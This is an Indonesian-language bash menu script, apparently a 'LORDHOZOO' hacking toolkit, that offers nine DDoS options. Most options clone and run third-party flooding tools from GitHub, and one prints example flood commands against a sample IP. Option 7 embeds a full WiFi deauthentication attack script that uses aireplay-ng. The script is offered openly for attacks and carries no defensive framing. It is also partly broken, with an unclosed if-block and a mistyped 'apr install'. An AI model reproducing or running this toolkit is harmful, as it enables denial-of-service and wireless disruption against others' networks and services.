mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
clear

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
function loading_animation() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "123456" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
sleep 0.28
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
clear

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "\033[32;1m┌──────────────────────────────────────────────────────────────┐"
echo -e "│ $yellow[01]$green .MENU DDOS LITE             │ "
echo -e "│ $yellow[02]$green .MENU DDOS OVERLOAD           │"
echo -e "│ $yellow[03]$green .MENU MHDDOS     │"
echo -e "│ $yellow[04]$green .MENU DOS       │"
echo -e "│ $yellow[05]$green .MENU DDOS MEDUSA    │"
echo -e "│ $yellow[06]$green .MENU DDOS POKRY       │"
echo -e "│ $yellow[07]$green .MENU DDOS ATTACK WIFI  │"
echo -e "│ $yellow[08]$green .MENU DDOS 503    │"
echo -e "│ $yellow[09]$green .MENU DDOS TELEGRAM     │"
echo -e "└──────────────────────────────────────────────────────────────┘"
echo -e "\033[39;1m╭─ROOT@LORDHOZOO@localhost /home"
read -p "╰─$" updt
# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    apt update -y 
    git clone https://github.com/4L13199/LITEDDOS
    cd LITEDDOS
    clear
    echo -e "
    This Tool Is Supporting For DDOS Activities, The Way Is Typing Command : $ python2 islddos.py <ip> <port> <packet> example: $python2 islddos.py 104.27.190.77 8080 100 IP target: 104.27.190.77 port: 8080 packet:100 Made In indonesia Indonesia Security Lite"
fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    pkg update -y
    pkg update -y
    
pkg install python3 python3-pip git -y
git clone https://github.com/7zx/overload
cd overload/
pip install -r requirements.txt
python3 overload.py
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    apt update -y
    git clone https://github.com/VPSHOZOO/KANDURA.sh
cd KANDURA.sh 
node DDOS_GAME.js
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    pkg update
    apt install git -y

apt install python -y

apr install python3 -y

git clone https://github.com/palahsu/DDoS-Ripper.git

cd DDoS-Ripper 
echo -e "python3 DRipper.py -s 0.00.00.00 -t 135"
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    apt update -y
    git clone https://github.com/TrashDono/MegaMedusa
cd MegaMedusa
python3 nvminstall.py
python3 installer.py
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    apt update -y
    apt install tcpdump tshark -y

git clone https://github.com/0vm/NetDeflect
cd NetDeflect

pip install psutil requests

python3 netdeflect.py
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    apt update -y
    #!/bin/bash

# Author: Slax38
# New Version v0.6.3 --> Design improvement
# Version v0.6.2
# Converted to bash by [Your Name]

DN="/dev/null"
stop_capture=false

menu() {
    echo
    echo "usage: ./WiFiDeauther.sh -help"
}

deauthattack() {
    local interface="$1"
    local bssid="$2"
    local deauth_count="$3"
    stop_capture=false
    
    echo
    echo "WiFiDeauther v0.6.3 WiFi Deauth Attack Tool, Slax38"
    echo
    echo "[+] Capturing beacon from $bssid"
    
    # In bash, capturing beacon frames would require different tools like tcpdump
    # This is a simplified version as scapy functionality doesn't directly translate
    echo "[!] Beacon capture functionality limited in bash version"
    read -p "Enter ESSID manually: " essid
    echo "[+] ESSID: $essid"
    
    # Deauth attack using aireplay-ng
    echo "[+] Starting deauth attack..."
    aireplay-ng --deauth "$deauth_count" -a "$bssid" "$interface" > "$DN" 2>&1
    
    if [ $? -eq 0 ]; then
        echo "[+] Deauth packets sent to $bssid"
    else
        echo "[!] Failed to send deauth packets"
    fi
    
    echo "[i] Deauth attack finished."
}

signal_handler() {
    echo "[!] Exit"
    exit 0
}

trap signal_handler SIGINT

deauthclient() {
    local interface="$1"
    local bssid="$2"
    local client="$3"
    local deauth_count="$4"
    
    echo "WiFiDeauther v0.6.3 WiFi Deauth Attack Tool, Slax38"
    echo "[+] Targeting client $client on AP $bssid"
    
    # Deauth attack using aireplay-ng with specific client
    aireplay-ng --deauth "$deauth_count" -a "$bssid" -c "$client" "$interface" > "$DN" 2>&1
    
    if [ $? -eq 0 ]; then
        echo "[+] Deauth packets sent to $client from $bssid"
    else
        echo "[!] Failed to send deauth packets"
    fi
    
    echo "[+] Deauth attack finished."
}

helpPanel() {
    which figlet >/dev/null 2>&1 && figlet "WiFiDeauther" || echo "WiFiDeauther"
    echo "------------------------------------------------------------------"
    echo -e "\tWiFiDeauther v0.6.3 WiFi Deauth Attack Tool, SX"
    echo
    echo "Arguments:"
    echo "-help, --helpPanel"
    echo "-i, --interface=<wlan0>"
    echo "-b, --bssid of the AP"
    echo "-c, --the client's mac   *optional"
    echo "-d, --deauths Ej: 100"
    echo
    echo "Example: ./WiFiDeauther.sh -i wlan0 -b ec:f0:fe:ff:fc:03 -d 500"
    echo " or"
    echo "./WiFiDeauther.sh -i wlan0 -b ec:f0:fe:ff:fc:03 -c 7c:2a.db:78:3b:14 -d 500"
    echo
    exit 0
}

# Parse arguments
while getopts ":hi:b:c:d:" opt; do
    case $opt in
        h) helpPanel ;;
        i) interface="$OPTARG" ;;
        b) bssid="$OPTARG" ;;
        c) client="$OPTARG" ;;
        d) deauth_count="$OPTARG" ;;
        \?) echo "Invalid option -$OPTARG" >&2; exit 1 ;;
    esac
done

# Check required arguments
if [ -z "$interface" ] || [ -z "$bssid" ] || [ -z "$deauth_count" ]; then
    echo "Missing required arguments!"
    helpPanel
    exit 1
fi

# Check if aireplay-ng is installed
if ! command -v aireplay-ng &> /dev/null; then
    echo "[!] aireplay-ng not found. Please install aircrack-ng package."
    exit 1
fi

# Check if interface is in monitor mode
iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"
if [ $? -ne 0 ]; then
    echo "[!] Interface $interface is not in monitor mode"
    read -p "Would you like to put it in monitor mode? [y/N] " choice
    if [[ "$choice" =~ ^[Yy]$ ]]; then
        airmon-ng start "$interface" > "$DN" 2>&1
        new_interface="${interface}mon"
        if [ -d "/sys/class/net/$new_interface" ]; then
            interface="$new_interface"
            echo "[+] Using interface $interface in monitor mode"
        else
            echo "[!] Failed to set monitor mode"
            exit 1
        fi
    else
        exit 0
    fi
fi

# Execute appropriate attack
if [ -n "$client" ]; then
    deauthclient "$interface" "$bssid" "$client" "$deauth_count"
else
    deauthattack "$interface" "$bssid" "$deauth_count"

fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    apt update -y
    git clone https://github.com/VPSHOZOO/KANDURA.sh
pip install bs4
clear
pip install colorama
clear
pip install os 
clear
pip install sys
clear
pip install requests
clear
pip install cfscrape
clear
pip install urllib3
clear
python DDOS_C2.py
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
    # Add your code here for option 9
    
    apt update -y
    
    rm -rf KANDURA.sh

git clone https://github.com/VPSHOZOO/KANDURA.sh

cd KANDURA.sh
node DDOS_TELEGRAM.js
fi

